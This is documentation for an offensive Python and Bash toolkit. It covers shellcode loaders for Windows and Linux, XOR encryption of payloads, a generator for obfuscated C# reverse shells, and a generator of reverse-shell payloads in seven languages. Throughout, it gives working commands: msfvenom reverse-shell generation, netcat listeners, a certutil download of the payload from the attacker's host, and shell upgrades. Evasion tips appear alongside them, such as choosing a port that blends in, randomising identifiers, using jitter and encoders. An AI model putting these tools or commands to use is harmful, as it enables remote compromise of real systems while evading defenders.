loader.py

Windows · Python 3.8+

Shellcode loader with W^X memory protection, optional XOR decryption, SHA256 integrity check, configurable thread timeout, and VirtualFree cleanup. Never allocates RWX — always RW → copy → RX.

Quick start

1

Generate shellcode with msfvenom

kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shellcode.bin
# -f raw  →  headerless bytes, ready for loader.py
2

[Optional] Encrypt with xor_encrypt_bin.py

kali
python3 xor_encrypt_bin.py shellcode.bin --key 0xDEADBEEF
# Prints SHA256 (plaintext) and ready-to-run loader.py command
3

Start listener, transfer, run

kali — listener
rlwrap nc -lvnp 4444
windows target
# Plaintext, default 30 s timeout
python loader.py shellcode.bin

# Encrypted + integrity check + verbose
python loader.py shellcode.enc --key 0xDEADBEEF --checksum <sha256hex> --verbose

# Longer timeout for staged payloads
python loader.py shellcode.bin --timeout 120

# Fire and forget
python loader.py shellcode.bin --timeout 0

Order matters: loader.py decrypts first, then verifies checksum. Always pass the SHA256 of the plaintext to --checksum. xor_encrypt_bin.py prints this automatically.

CLI reference

ArgumentTypeDefaultDescription
shellcode_filepath—Raw or XOR-encrypted .bin file
--key HEXhex stringnoneXOR key (0xDEADBEEF, DEADBEEF, 0xAB). Cyclic. Omit for plaintext.
--checksum SHA256hex stringnoneSHA256 of the decrypted shellcode. Aborts on mismatch before allocation.
--timeout Nint (s)30Max seconds to wait for shellcode thread. 0 = INFINITE.
--verboseflagoffDEBUG output — addresses, thread IDs, protection changes.

Memory lifecycle

execution order
VirtualAlloc        PAGE_READWRITE      ← writable, not executable
RtlMoveMemory       copy shellcode       ← write while RW
VirtualProtect      PAGE_EXECUTE_READ   ← write bit removed before first instruction
CreateThread        addr → shellcode
WaitForSingleObject timeout_ms
──── finally block always runs ────
VirtualFree         MEM_RELEASE         ← released even on error / timeout

linux_loader.py

Linux · Python 3.8+

Linux equivalent of loader.py. Uses mmap/mprotect/munmap (libc via ctypes) instead of Win32 API. Same W^X enforcement, same CLI, same --key / --checksum format. Timeout via SIGALRM instead of thread wait.

Quick start

kali → linux target
# 1. Generate Linux shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shellcode.bin

# 2. [Optional] Encrypt
python3 xor_encrypt_bin.py shellcode.bin --key 0xDEADBEEF

# 3. Listener
rlwrap nc -lvnp 4444

# 4. Linux target
python3 linux_loader.py shellcode.bin
python3 linux_loader.py shellcode.enc --key 0xDEADBEEF --checksum <sha256> --verbose
python3 linux_loader.py shellcode.bin --timeout 0   # no timeout

Memory lifecycle

execution order
mmap        PROT_READ|PROT_WRITE      ← writable, not executable
memcpy      copy shellcode             ← write while RW
mprotect    PROT_READ|PROT_EXEC       ← write bit removed
CFUNCTYPE   call shellcode as function
SIGALRM     timeout guard
──── finally ────
munmap      release region             ← always released

xor_encrypt_bin.py

Kali · Python 3.8+

Companion to loader.py. Pre-encrypts shellcode on Kali before dropping it on the target. Uses the same key format as loader.py, writes a raw .enc file, and prints everything you need to copy-paste — key, SHA256, and the ready-to-run loader.py command.

Usage examples

kali
# Random 4-byte key (default) — key printed in loader.py format
python3 xor_encrypt_bin.py shellcode.bin

# Fixed key, explicit output path
python3 xor_encrypt_bin.py shellcode.bin --key 0xDEADBEEF -o /tmp/drop/sc.enc

# Random 16-byte key + round-trip verify
python3 xor_encrypt_bin.py shellcode.bin --key-len 16 --verify

# Verbose: shows individual key bytes
python3 xor_encrypt_bin.py shellcode.bin --key 0xCAFEBABE --verbose

# Pipe encrypted bytes to another tool
python3 xor_encrypt_bin.py shellcode.bin --key 0xAB --stdout | xxd | head

cs_revshell / gen.sh

Kali · Bash

Generates a C# reverse shell with a 4-byte cyclic XOR key, fully randomised identifiers per run, reconnect loop with jitter and back-off, and UTF-8 I/O. Outputs shell.cs ready to compile.

Quick start

1

Make executable (once) + start listener

kali
chmod +x cs_revshell/gen.sh
rlwrap nc -lvnp 5986   # port 5986 = WinRM, blends in
2

Generate shell.cs

kali
# Defaults: tun0 · 5986 · ./ · 5 retries · 3000 ms jitter
./cs_revshell/gen.sh

# Custom: eth0, port 443, output /tmp/drop, 10 retries, 1 s jitter
./cs_revshell/gen.sh eth0 443 /tmp/drop 10 1000
3

Transfer and compile

kali — compile locally (no compiler needed on target)
mcs -out:svc.exe shell.cs
python3 -m http.server 8080
windows target
certutil -urlcache -split -f http://<LHOST>:8080/svc.exe svc.exe
.\svc.exe

# Or compile on target if .cs was transferred
csc.exe /nologo /out:svc.exe shell.cs

Arguments reference

PositionDefaultDescription
$1 interfacetun0Network interface to resolve LHOST from
$2 port5986Listener port — validated 1–65535
$3 output_dir.Directory for shell.cs (created if missing)
$4 max_retries5Reconnect attempts before binary exits
$5 jitter_ms3000Max random sleep (ms) before each connect attempt

gen_linux_shell.sh

Kali → Linux target

Generates 7 reverse shell payloads in one shot — bash, python, socat, netcat, perl, php, and C (ELF). All pre-populated with LHOST/LPORT. Pick whichever fits the target.

Usage

kali
chmod +x gen_linux_shell.sh

# Defaults: tun0, port 4444, output ./shells/
./gen_linux_shell.sh

# Custom: eth0, port 443, output /tmp/drop
./gen_linux_shell.sh eth0 443 /tmp/drop

Generated payloads

FileLanguageNotes
bash_shell.shBash/dev/tcp one-liner — most compatible, no deps
python_shell.pyPython 3PTY spawn — full interactive shell
socat_shell.shBash/socatInteractive TTY — best quality, needs socat on target
nc_shell.shBash/ncmkfifo trick — no -e flag needed
perl_shell.plPerlSocket shell — Perl almost always installed
php_shell.phpPHPFor web upload scenarios
elf_revshell.cCCompile: gcc -o revshell elf_revshell.c

Shell upgrade (after catching any shell)

on target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm

Listeners

msfvenom formats

  • -f raw → .bin for loader.py / linux_loader.py
  • -f exe / -f elf → standalone binary
  • -f dll → DLL for injection
  • -f ps1 → PowerShell stager
  • -a x64 --platform win|linux
  • -e x86/shikata_ga_nai -i 3 — encoder
